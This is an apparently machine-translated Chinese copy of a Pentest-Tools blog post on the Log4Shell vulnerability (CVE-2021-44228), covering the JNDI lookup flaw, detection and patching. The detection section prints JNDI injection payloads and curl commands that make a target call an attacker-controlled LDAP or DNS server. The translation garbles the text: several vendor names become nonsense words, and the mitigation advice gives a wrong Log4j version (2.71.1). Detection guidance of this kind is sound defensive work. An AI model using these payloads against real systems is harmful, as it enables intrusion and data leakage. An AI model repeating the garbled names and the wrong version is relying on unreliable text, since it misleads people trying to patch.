<html>
<head>
<title>Log4Shell scanner: detect and exploit Log4j CVE-2021-44228 in your network and web apps | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>Log4Shell scanner:在您的网络和web应用程序中检测和利用Log4j CVE-2021-44228 | Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/log4shell-scanner-detect-cve-2021-44228#2022-07-09T02:58:10.000Z">https://pentest-tools.com/blog/log4shell-scanner-detect-cve-2021-44228#2022-07-09T02:58:10.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>我们<em>几乎</em>到达了急需的假期……然后<strong>日志4外壳</strong>发生了。</p><p>在信息安全社区中，我们似乎不能拥有美好的事物。然而，现实是我们与复杂的系统一起工作，这些系统相互依赖的程度超过了我们任何人所能接受的程度。</p><p><img src="../Images/a7ccd657ff362b102a0ccbc0ac905f8c.png" alt="Log4Shell to exploit them all" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L3VudGl0bGVkLmpwZWc=?s=d43dbdaf712d7ad07781ebc2df71c72c"/></p><p>当您必须处理像最新的Log4j漏洞(<a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" rel="external nofollow noopener noreferrer">cvss v3</a><a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" rel="external nofollow noopener noreferrer"><strong>10.0</strong></a>)这样的关键漏洞时，剩下要做的就是调动您最好的工具集和节省时间的步骤。最大努力！</p><p>2021年12月9日，一场针对<a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" rel="external nofollow noopener noreferrer"> CVE-2021-44228 </a>的持续攻击在野外被发现。在那之后，一个概念验证就发布了——让网络安全社区感到恐惧的是——我们都看到了利用这个漏洞是多么的容易。</p><p><em>那么，是什么让它成为如此重大的问题呢</em>？让我们快速回顾一下基本原理。</p><h2 id="what-is-log4j"><strong>Log4j是什么？</strong></h2><p>Log4j 是一个广泛使用的日志库，许多应用程序和服务都使用它，它也是几个Java日志框架之一。它是Apache日志服务的一部分，Apache日志服务是Apache软件基金会的一个项目。</p><blockquote><p>Log4j是Java编程语言中常用的日志库。<br/> <br/>记录器是一种将数据保存在电脑上的软件。它用于监控正在发生的事情，确定软件运行是否顺利，或者在出现问题时捕捉信息以帮助调试。</p><p>— Emy | eq🌈(@ entropyqueen _)<a href="https://twitter.com/entropyqueen_/status/1469606441195556865?ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">2021年12月11日</a></p></blockquote><p/><p><img src="../Images/bf69e84c69dd4b90bf9f5ec44cde38f1.png" alt="Apache Log4J" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L3VudGl0bGVkLnBuZw==?s=84ccecd723c20d31b1ded96e054be8cd"/></p><p>由于Log4j中这种漏洞的普遍使用和攻击这种漏洞的低复杂性——这也恰好具有最高的可能风险级别——最坏情况的前提被提出。</p><h2 id="log4shell-attack-surface"><strong>log 4外壳攻击面</strong></h2><p>根据这个<a target="_blank" href="https://github.com/NCSC-NL/log4shell/tree/main/software" rel="external nofollow noopener noreferrer">库</a>，以下组织被确认具有受CVE-2021-44228影响的易受攻击系统:</p><ul><li><p>苹果</p></li><li><p>腾讯</p></li><li><p>蒸汽</p></li><li><p>推特</p></li><li><p>百度(全球最大的中文搜索引擎)</p></li><li><p>姐姐</p></li><li><p>法学博士(Jurum Doctor)</p></li><li><p>网易</p></li><li><p>云耀斑</p></li><li><p>亚马孙</p></li><li><p>特斯拉</p></li><li><p>阿帕奇索尔</p></li><li><p>阿帕奇德鲁伊</p></li><li><p>Apache Struts2</p></li><li><p>IBM Qradar SIEM</p></li><li><p>帕洛阿尔托全景</p></li><li><p>弹性搜索</p></li><li><p>吉德拉</p></li><li><p>《我的世界》</p></li><li><p>脉冲安全</p></li><li><p>UniFi</p></li><li><p>VMWare</p></li><li><p>搅拌机</p></li><li><p>谷歌</p></li><li><p>Webex</p></li><li><p>商务化人际关系网</p></li></ul><h2 id="how-the-log4shell-vulnerability-works"><strong>log 4 shell漏洞如何工作</strong></h2><p>该漏洞的根本原因是在Apache Log4j &lt; = 2.14.1中实现的JNDI功能中的<strong>不正确的输入验证</strong>。</p><p>在易受攻击的版本中，默认情况下会启用一种称为“消息查找替换”的功能，该功能允许威胁参与者从远程LDAP服务器加载和执行任意Java代码。</p><p>此外，在JNDI查找中支持多种协议，包括LDAP、LDAPS、DNS和RMI。因此，如果攻击者可以控制日志消息，并通过输入参数之一或在<a target="_blank" href="/blog/essential-http-security-headers"> HTTP头</a>中注入任意代码，他们就可以在受控服务器上创建恶意Java类，并迫使易受攻击的服务器使用查找方法从LDAP/LDAPS/DNS/RMI服务器执行该Java类。</p><p><img src="../Images/9807acae82fc8f430e0165106c3abd5e.png" alt="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L3VudGl0bGVkLTEucG5n?s=4febdb8bf4a6471288f5c51c7a4a2f5b"/></p><p>来源:<a target="_blank" href="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/" rel="external nofollow noopener noreferrer">瑞士政府认证</a></p><h2 id="vulnerable-log4j-versions"><strong>易受攻击的Log4j版本</strong></h2><p><strong>2 . 17 . 1之前的所有</strong> Log4j版本都会受到影响。</p><p>风险在于，未经验证的远程攻击者可以完全危及服务器的安全，窃取机密信息、安装勒索软件或转向<a href="/blog/internal-network-scanning">内部网络</a>。</p><h2 id="how-to-detect-log4shell-cve-2021-44228-in-ethical-hacking-engagements"><strong>如何检测道德黑客活动中的log 4 shell/CVE-2021-44228</strong></h2><p>为了<strong>探测CVE-2021-44228 </strong>，你可以注入以下有效载荷:</p><h4><strong> LDAP: </strong></h4><p><strong> ${jndi:ldap:// &lt; LDAP <em>受控</em>服务器&gt; /a} </strong>在每个参数或每个HTTP头中，然后检查远程记录器是否被访问。</p><h4><strong>域名系统:</strong></h4><p><strong> ${jndi:dns://${hostName}。&lt; DNS <em>控制的</em>服务器&gt; } </strong>在每个参数或每个HTTP头中，然后检查远程记录器是否被访问。</p><p>您可以使用以下记录器:<a target="_blank" href="https://canarytokens.org/generate" rel="external nofollow noopener noreferrer"> CanaryTokens </a>或<a target="_blank" href="https://log4shell.huntress.com/" rel="external nofollow noopener noreferrer"> Log4shell Tester </a>来确定您的应用程序是否容易受到CVE-2021-44228的攻击。</p><p>例如，如果您想要在“X-Api-Version”HTTP头中注入有效负载，您可以使用以下请求:</p><div class="content-highlight"><pre class="code-block"><code>curl &lt;vulnerable_IP_address&gt;:&lt;vulnerabe_port&gt; -H 'X-Api-Version:
${jndi:ldap://&lt;LDAP_controlled_server&gt;/a}
curl &lt;vulnerable_IP_address&gt;:&lt;vulnerabe_port&gt; -H 'X-Api-Version:
${jndi:dns:/${hostName}.&lt;DNS_controlled_server&gt;}</code></pre></div><p>确认CVE-2021-44228在你的目标上是可利用的最快和最省事的方法是使用<a href="https://pentest-tools.com/exploit-helpers/sniper">狙击自动利用者</a>，Pentest-Tools.com上的自动攻击者。</p><p>该工具自动模拟现实世界的利用和攻击技术:</p><ul><li><p>它扫描开放的端口，收集有关协议、服务类型和版本的数据</p></li><li><p>它对web服务进行指纹识别，以确定运行的web应用程序的类型及其背后的技术栈</p></li><li><p>它寻找兼容的利用</p></li><li><p>它检查目标是否确实易受攻击，在此阶段不提取任何数据</p></li><li><p>一旦获得RCE，Sniper自动提取所有工件(当前和本地用户，系统信息，运行进程，网络配置等。)，这将在输出报告中得到</p></li><li><p>它确实会清除，所以目标保持不变。</p></li></ul><p>我们使用<strong> LDAP </strong>来<a href="/blog/how-we-detect-log4shell">利用Log4Shell漏洞</a>。</p><p><img src="../Images/798f6f257fd333693a106ffa17b5a7fe.png" alt="Sniper exploitation summary for Log4j vuln" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L3NuaXBlci1leHBsb2l0YXRpb24tc3VtbWFyeS1mb3ItbG9nNGotdnVsbi5wbmc=?s=fa48067011f8a47e02b8745acb1eef35"/></p><p><img src="../Images/fb62343cf12825fc4a28911feb7521e9.png" alt="local users found with Sniper" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L2xvY2FsLXVzZXJzLWZvdW5kLXdpdGgtc25pcGVyLnBuZw==?s=42d843011593997f7630fb0011390573"/></p><p><img src="../Images/6dcef8112527c8e7ccd17355e553efdf.png" alt="files extracted with Sniper" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L2Rpc2stZmlsZXMtZXh0cmFjdGVkLXdpdGgtc25pcGVyLnBuZw==?s=93c749cf4bfaa86ddaafff7a3e8c5ba5"/></p><p>这一切都发生在一分钟内——从字面上来说——与手工开发相比，这是一个巨大的收获，特别是当你在一个pentest中时间紧迫时(什么时候不会发生这种情况？).</p><p>由于Sniper不生成结果，如果您想用漏洞填充结果页面，请运行默认包含Sniper检测模块的<a href="https://pentest-tools.com/network-vulnerability-scanning/network-security-scanner-online-openvas">网络漏洞扫描</a>。我们使用DNS查询来验证漏洞是否存在。</p><p><img src="../Images/30ecc4d1f75fcbf710c8fcdd79e98e1a.png" alt="Log4j vulnerability exploitation with Sniper" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvbG9nNHNoZWxsLXNjYW5uZXItZGV0ZWN0LWN2ZS0yMDIxLTQ0MjI4L2xvZzRqLXZ1bG5lcmFiaWxpdHktZXhwbG9pdGF0aW9uLXdpdGgtc25pcGVyLnBuZw==?s=88e90cb8cfe4bdabdb5187be34cbd757"/></p><h2 id="how-to-mitigate-cve-2021-44228"><strong>如何缓解CVE-2021-44228 </strong></h2><p>我们建议将Log4j库升级到<strong>至少2.71.1 </strong>版本，修复该漏洞和第一个补丁发布后发现的安全问题。</p><p>然而，打补丁说起来容易做起来难，原因有很多，信息安全社区都很清楚。我们赞扬整个行业的事故响应团队和专家尽最大努力将风险和损失降至最低！</p><p>我们将继续为您提供所需的工具，帮助您在压力下尽可能出色地完成工作——无论您负责的系统是在地球上还是在太空中，我们都会为您带来最新消息！</p><blockquote><p>你知道火星2020直升机任务“独创性”是由阿帕奇Log4j驱动的吗？<br/><a href="https://t.co/gV0uyE1ylk" rel="external nofollow noopener noreferrer">【https://t.co/gV0uyE1ylk】</a><br/><a href="https://twitter.com/hashtag/Apache?src=hash&amp;ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">【阿帕奇】</a> <a href="https://twitter.com/hashtag/OpenSource?src=hash&amp;ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">【开源】</a> <a href="https://twitter.com/hashtag/innovation?src=hash&amp;ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">【创新】</a> <a href="https://twitter.com/hashtag/community?src=hash&amp;ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">【社区】</a> <a href="https://twitter.com/hashtag/logging?src=hash&amp;ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">【日志】</a> <a href="https://twitter.com/hashtag/services?src=hash&amp;ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">【服务】</a><br/><a href="https://t.co/aFX9JdquP1" rel="external nofollow noopener noreferrer">pic.twitter.com/aFX9JdquP1</a></p><p>—阿帕奇—ASF(@ TheASF)<a href="https://twitter.com/TheASF/status/1400875147163279374?ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">2021年6月4日</a></p></blockquote><p>为防御者和攻击性安全团队提供最新的漏洞指导，请将<a target="_blank" href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance" rel="external nofollow noopener noreferrer"> CISA的建议</a>加入书签。</p><p>为防御者和攻击性安全团队提供最新的漏洞指导，请将<a target="_blank" href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance" rel="external nofollow noopener noreferrer"> CISA的建议</a>加入书签。</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>